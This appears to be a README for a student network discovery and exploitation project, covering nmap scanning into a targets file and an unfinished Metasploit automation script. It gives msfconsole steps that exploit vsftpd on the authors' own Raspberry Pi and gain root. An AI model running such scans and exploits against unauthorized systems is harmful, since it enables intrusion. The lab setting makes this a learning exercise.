Device Discovery and Exploitation Scripts
==

I. Installing Required Libraries/Software nmap and Running nmap_scanner.py
---

1. To install nmap, run the following:

`$ sudo apt-get update`

`$ sudo apt-get install nmap` [Warning: Might have to move the downloaded nmap directory into the python directory]

If you've run these commands and get an "nmap not found" type error when running `nmap_scanner.py`, try `sudo apt-get install python-nmap`, `sudo apt-get install python3-nmap`, or `pip install nmap`.

2. To install MetaSploit, use the [free installer](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), which contains all dependencies needed for `exploitation_script.py`.

II. `nmap_scanner.py`
--

This script scans for devices and services on a network the Kali Linux device is connected to.

To run this script, navigate to the directory it's in, then run:

`sudo python3 nmap_scanner.py`

When ran, it generates console output as well as a file in the current directory called `targets.txt`. This file contains a table of values with each line being a device or service discovered. The columns of the table are:

`port` | `state` | `name` | `product` | `version` | `extrainfo` | `ocpe` | `ip`

`port` is the network port the device/service is running on

`state` is the state of the `port` (such as `open`)

`name` is the type of service (e.g., ftp, ssh, https)

`product` is the name of the device/service

`version` is the current version of the device/service

`extrainfo` is a field `nmap` gives containing any other information

`ocpe` contains operating system information

`ip` is the IP address of the device/service.

To view just a page of `targets.txt`, in the same directory as `nmap_scanner.py` was run, run `less targets.txt`. As the results from a scan can be very large, this is often preferable to `cat targets.txt`, which displays the whole file.

Future development plans include:

1. `exploitation_script.py` using the information in `targets.txt` to automate the exploitation process.
2. Changing the formatting of `targets.txt` to be both more visually pleasing and useful to `exploitation_script.py`.

<!-- For this project, we have generated our [own network using a Raspberry Pi](https://thepi.io/how-to-use-your-raspberry-pi-as-a-wireless-access-point/). When nmap_scanner.py is ran, it will generate an output file containing a matrix full of information related to the target device(s). This information is  The most critical component of information is the `state`, as it will give the port number that is open on the target device. `name` contains the product's name, and `version` contains its version number. The file `nmap_scanner.py` generates is called `targets.txt`. In future development, `exploitation_script.py` will use this file by tokenizing it and running exploit scans on every target device. The user can then choose which device they want to exploit, and `exploitation_script.py` will execute it. -->

III. `exploitation_script.py` (In Progress)
--

This script, still under development, will search an [open-sourced MetaSploit library's database](https://pypi.org/project/pymetasploit3/) for exploits of devices and services listed in `targets.txt`. The user may then choose an exploit to compromise a device or service.

To run this script:

1. Start the MetaSploit console (`$ msfconsole`, see next section) in the background in a different shell window. It will be accessed by `exploitation_script.py` running on an alternative shell, so don't close out of it or run multiple instances. The latter will cause a traceroute error to occur. 
2. Navigate to the directory `exploitation_script.py` is in (you're usually already there having run `nmap_scanner.py`), then run:

`sudo python3 exploitation_script.py`

Future development plans include:

1. `exploitation_script.py`'s search using the information in `targets.txt` functioning properly
2. Automating away much of what's seen in Section IV for ease of use

<!-- `exploitation_script.py` will open the `nmap_scanner.py`-generated `targets.txt` file. It will then search for potential exploits for every single target device listed, displaying them to the user who can choose a specific device to exploit. Using , the exploitation process is automated and `exploitation_script.py` uses the byte payload generated by MetaSploit to compromise the user's chosen target device. -->

IV. Using MetaSploit Console
--

As development of `exploitation_script.py`, whose goal is to automate this process, continues, an alternative method is running exploits via MetaSploit console commands.

Initiate MetaSploit (in a different window than you ran `nmap_scanner.py`) in with the following command:

`$ msfconsole`

It may ask for you to set a password. Once the console has started in that new window (NOTE: if you close out of it or run multiple instances, you'll get a traceroute error), follow these steps to run an exploit:

1. Search for the chosen device/service in the MetaSploit database:

    `search (device/service name)` // In our test case, we're exploiting `vsftpd` running on an Ubuntu MATE Raspberry Pi
    
2. Use your chosen exploit by exploit index number:

    `use (idx)` // In our test case, there's just one exploit in the database, so we `use 0`
    
3. If it doesn't start, show options that you need to configure:

    `show options`
    
4. Fill out any missing options. For us, we needed to set the RHOSTS option to the device's IP address:

    `set RHOSTS (target device IP)`
    
5. You may need to fill out other options as well. We did:

    `set LHOST localhost`
    `set LPORT 443`
    
6. Finally, run the exploit:

    `run`
    
    In our test case, this grants root access to the device running `vsftpd`.
